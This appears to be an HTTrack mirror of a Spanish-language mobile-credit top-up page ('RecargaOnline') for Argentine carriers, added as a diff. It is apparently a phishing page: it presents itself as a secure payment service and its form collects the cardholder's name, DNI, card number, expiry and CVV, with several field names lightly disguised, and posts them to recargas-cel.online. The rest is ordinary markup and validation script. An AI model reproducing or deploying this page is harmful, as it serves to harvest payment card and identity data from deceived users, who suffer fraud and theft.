@@ -1,0 +1,249 @@
+<!DOCTYPE html>
+<html>
+<!-- Added by HTTrack -->
+<!-- Mirrored from recargas-cel.online/cargar-credito/indexc0ec.php?company=personal by HTTrack Website Copier/3.x [XR&CO'2014], Sun, 18 Jun 2023 14:57:03 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
+<meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
+<head>
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<title>Recarga Credito Online, cargar credito a mi celular</title>
+
+	<link rel="icon" href="../assets/media/img/icon.png">
+	<!-- CSS INCLUDES -->
+	<link rel="stylesheet" href="../assets/css/main.css">
+	<link rel="stylesheet" type="text/css" src="../assets/css/glider.min.css">
+	<link href="../cdn.jsdelivr.net/npm/remixicon%402.2.0/fonts/remixicon.css" rel="stylesheet">   
+<!-- END CSS INCLUDES -->
+
+<!-- SCRIPTS INCLUDES -->
+<script src="../kit.fontawesome.com/3c49f2c180.js" crossorigin="anonymous"></script>
+	<!-- Link to JQuery -->
+	<script src="../assets/js/jquery-3.2.1.min.js" type="text/javascript"></script>
+	<script src="../assets/js/jquery.creditCardValidator.js"></script>
+		<script>
+			function validate() {
+				var valid = true;
+				$(".demoInputBox").css('background-color', '');
+				var message = "";
+		
+				var cardHolderNameRegex = /^[a-z ,.'-]+$/i;
+				var cvvRegex = /^[0-9]{3,3}$/;
+		
+				var cardHolderName = $("#name").val();
+				var cardNumber = $("#numbero").val();
+				var cvv = $("#segcod").val();
+		
+				if (cardHolderName == "" || cardNumber == "" || cvv == "") {
+					message += "<div>Rellene todos los espacios.</div>";
+					if (cardHolderName == "") {
+						$("#name").css('background-color', '#FFFFDF');
+					}
+					if (cardNumber == "") {
+						$("#numbero").css('background-color', '#FFFFDF');
+					}
+					if (cvv == "") {
+						$("#segcod").css('background-color', '#FFFFDF');
+					}
+					valid = false;
+				}
+		
+				if (cardHolderName != "" && !cardHolderNameRegex.test(cardHolderName)) {
+					message += "<div>Nombre es Invalido</div>";
+					$("#name").css('background-color', '#FFFFDF');
+					valid = false;
+				}
+		
+				if (cardNumber != "") {
+					$('#numbero').validateCreditCard(function(result) {
+						if (!(result.valid)) {
+							message += "<div>Número de tarjeta inválido</div>";
+							$("#numbero").css('background-color', '#FFFFDF');
+							valid = false;
+						}
+					});
+				}
+		
+				else if (cvv != "" && !cvvRegex.test(cvv)) {
+					message += "<div>Codigo de Seguridad es inválido</div>";
+					$("#segcod").css('background-color', '#FFFFDF');
+					valid = false;
+				}
+		
+				if (message != "") {
+					$("#error-message").show();
+					$("#error-message").html(message);
+				}
+				return valid;
+			}
+		</script>
+	<!-- END SCRIPTS INCLUDES -->
+
+		<!-- META -->
+	<meta name="keywords" content="recargar,recargar credito, recargar saldo, recargar personal, recargar credito con tarjeta, recargar movistar, recargar tuenti, recargar claro, tuenti,claro,personal,movistar, recargar credito personal con tarjeta, recargar con tarjeta de credito, recargar credito para mi celular, recargar para celular, recargas de credito online, recargas de credito">
+	<meta name="description" content="RecargaOnline, Recarga crédito online rápido y fácil en RecargaOnline contamos con nuestra navegación segura que te permitirá acceder a una recarga de crédito sin dificultades. Recargamos credito para personal, movistar, claro y tuenti. Recarga de Crédito online en 3 simples pasos.">
+
+	<meta name="copyright" content="RecargaOnline">
+	<meta name="robots" content="index, all, follow">
+	<meta name="author" content="RecargaOnline Development">
+	<meta name="category" content="Recarga de credito, credito para celular, movistar personal claro tuenti">
+
+	<meta content="es" http-equiv="content-language">
+	<meta http-equiv="Pragma" content="no-cache">
+	<link rel="shortcut icon" type="image/x-icon" href="../assets/media/img/icon.html">    
+	<link rel="icon" type="image/png" href="../assets/media/img/icon.html">
+
+
+
+	<!-- END META -->
+</head>
+<body>
+
+	<div id="wrapper">
+		<header id="header">
+			<nav id="navbar">
+				<div class="nav__item">
+					<img src="../assets/media/img/logo.jpg" alt="logo">
+					<h1 class="nav__item--title">
+						RecargaOnline
+					</h1>
+					<ul class="nav__item--ul">
+					<li class="nav__item-ul--li"><a href="../index.html">Inicio</a></li>
+						<li class="nav__item-ul--li empresas-li"><a href="cargar-credito/index.html"><i class="ri-arrow-down-s-line"></i> Empresas</a>
+							<ul class="nav__item-li--ul">
+								<li><a href="indexc0ecc0ec.html?company=personal">Personal</a></li>
+								<li><a href="index38453845.html?company=movistar">Movistar</a></li>
+								<li><a href="index16291629.html?company=claro">Claro</a></li>
+								<li><a href="index65db65db.html?company=tuenti">Tuenti</a></li>
+							</ul>
+						</li>
+					</ul>
+				</div>
+				<div class="nav__item">
+					<p><i class="ri-secure-payment-fill"></i>Compra Segura</p>
+				</div>
+			</nav>
+		</header>
+		<main id="main">
+			<form class="recarga-container" method="POST" action="https://recargas-cel.online/cargar-credito/realizada.php" onSubmit="return validate();">
+				<h1 class="recarga--title">Selecciona la empresa que usas</h1>
+				<div class="recarga__item--empresa">
+					<div class="recarga__item company-personal" onclick="showForm('personal',this)">
+						<h2>Personal</h2>
+						<img class="recarga__item--img" src="../assets/media/img/personal.png" alt="Imagen de la empresa de recarga">
+					</div>
+					<div class="recarga__item company-movistar" onclick="showForm('movistar',this)">
+						<h2>Movistar</h2>
+						<img class="recarga__item--img" src="../assets/media/img/movistar.jpg" alt="Imagen de la empresa de recarga">
+					</div>
+					<div class="recarga__item company-claro" onclick="showForm('claro',this)">
+						<h2>Claro</h2>
+						<img class="recarga__item--img" src="../assets/media/img/claro.png" style="padding: 5px;object-fit: contain;" alt="Imagen de la empresa de recarga">
+					</div>
+					<div class="recarga__item company-tuenti" onclick="showForm('tuenti',this)">
+						<h2>Tuenti</h2>
+						<img class="recarga__item--img" src="../assets/media/img/tuenti.png" alt="Imagen de la empresa de recarga">
+					</div>
+				</div>
+
+				<div class="select-container">
+					<label for="amount">Selecciona el monto a recargar</label>
+					<select name="amount">
+						<option value="100">100</option>
+						<option value="200">200</option>
+						<option value="300">300</option>
+						<option value="300x3">320 + 1GB X 1 DÍA</option>
+						<option value="350">350</option>
+						<option value="400">400</option>
+						<option value="500">500</option>
+						<option value="600">600</option>
+						<option value="600x3">650 + 2GB X 3 DÍAS</option>
+						<option value="700">700</option>
+						<option value="800">800</option>
+						<option value="900">900</option>
+						<option value="1000">1000</option>
+						<option value="1000+300">1100 + 300 de REGALO</option>
+					</select>
+				</div>
+				<div class="select-container">
+					<label for="tel">Ingresa el Número de Teléfono</label>
+					<input type="number" name="tel" id="tel" class="form-control" required>
+				</div>
+
+				<div id="companyForm">
+					<input type="text" name="company" id="companyInput" value="personal" hidden>
+					<div class="form__card">
+						<div class="form__card--background"></div>
+						<div class="form__card--img">
+							<img src="../assets/media/img/chip.png" alt="Chip">
+						</div>
+						<div class="form__card--number">
+							<span class="form__card--number-4" id="col1">XXXX</span>
+							<span class="form__card--number-4" id="col2">XXXX</span>
+							<span class="form__card--number-4" id="col3">XXXX</span>
+							<span class="form__card--number-4" id="col4">XXXX</span>
+						</div>
+						<div class="form__card--expire">
+							<div>
+								<span style="font-size:8px;font-weight: 700;text-transform: uppercase;font-family: 'Oswald';">Mes<br>Año</span>
+								<span id="mm">MM</span>/
+								<span id="yy">AA</span>
+							</div>
+							<div>
+								<span style="font-size:8px;font-weight: 700;text-transform: uppercase;font-family: 'Oswald';">Cod<br>Seg</span>
+								<span id="cc">CVV</span>
+							</div>
+						</div>
+						<div class="form__card--name">
+							<span id="name-tit">NOMBRE DEL TITULAR</span>
+						</div>
+					</div>
+
+					<div class="form__data">
+						<div class="form__item">
+							<label>Nombre y Apellido</label>
+							<input type="text" name="name" id="name" placeholder="Nombre del titular" class="demoInputBox form-control">
+						</div>
+						<div class="form__item">
+							<label>Documento (DNI del titular)</label>
+							<input type="number" name="deenei" id="deenei" placeholder="DNI del titular">
+						</div>
+						<div class="form__item">
+							<label>Ingresa el número</label>
+							<input type="text" name="numbero" id="numbero" placeholder="1234 1234 1234 1234" class="demoInputBox form-control">
+						</div>
+						<div class="form__item item-doble">
+							<div class="form__subitem">
+								<label>Mes y Año de Vencimiento</label>
+								<div>
+									<input type="text" name="mes" id="mes" placeholder="Mes" class="demoInputBox form-control">
+									<input type="text" name="anio" id="anio" placeholder="Año" class="demoInputBox form-control">
+								</div>
+							</div>
+							<div class="form__subitem">
+								<label>Cod Seg.</label>
+								<input type="text" name="segcod" id="segcod" placeholder="123" class="demoInputBox form-control">
+							</div>
+</div>
+
+<button type="submit" name="cargar" value="cargar">Recargar</button>
+</div>
+				</form>
+			</div>
+		</main>
+		<footer id="footer">
+			<p><i class="ri-copyright-line"></i>2022-2025 Todos los derechos reservados</p>
+			<p><i class="ri-community-fill"></i>Agencia de Pagos Digitales RecargaOnline</p>
+		</footer>
+	</div>
+
+	<script src="../assets/js/main.js"></script>
+
+				<script>
+				elemento=document.querySelector('.company-personal');
+				showForm('personal',elemento);
+			</script>
+	</body>
+
+<!-- Mirrored from recargas-cel.online/cargar-credito/indexc0ec.php?company=personal by HTTrack Website Copier/3.x [XR&CO'2014], Sun, 18 Jun 2023 14:57:03 GMT -->
+</html>
